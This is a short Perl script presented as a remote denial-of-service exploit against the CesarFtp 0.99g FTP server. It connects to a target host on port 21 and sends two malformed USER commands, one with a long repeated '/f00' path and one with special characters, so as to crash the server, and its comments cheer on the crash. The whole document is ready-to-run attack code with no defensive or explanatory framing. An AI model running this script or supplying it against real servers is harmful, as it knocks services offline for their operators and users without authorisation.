#!/usr/local/bin/perl
# DOS remote exploit for CesarFtp 0.99g
#It will try to crash CesarFtp Server remotely:)


use Socket;

$ARGC=@ARGV;
if ($ARGC !=1) {
        print "Usage: $0 <host>\n";
        exit;
}


$string="x" x $length;

my($remote,$port,$iaddr,$paddr,$proto,$line);
$remote=$ARGV[0];
$port = "21";

$iaddr = inet_aton($remote) or die "Error: $!";
$paddr = sockaddr_in($port, $iaddr) or die "Error: $!";
$proto = getprotobyname('tcp') or die "Error: $!";

socket(SOCK, PF_INET, SOCK_STREAM, $proto) or die "Error: $!";
connect(SOCK, $paddr) or die "Error: $!";
$login1="user /f00/f00/f00/f00/f00/f00/f00/f00/f00/f00/f00/f00/f00/
        f00/f00/f00/f00/f00/f00/f00/f00/f00/f00/f00/f00/f00/
        f00/f00/f00/f00/f00/f00/f00/f00/f00/f00/f00/f00/f00/
        f00/f00/f00/f00/f00/f00/f00/f00/f00/f00/f00/f00/f00/
        f00/\n";

#---------------------------------------------------
print "Sending evil request 1...\n";
print ($login1);
send(SOCK,$login1, 0) or die "Cannot send query: $!";
$login1="user !@#$%^&*()_\n";
print "Sending evil request 2...\n";
print ($login1);
send(SOCK,$login1, 0) or die "Cannot send query: $!";
print "Now if you are lucky the server will crash:)\n"

#End

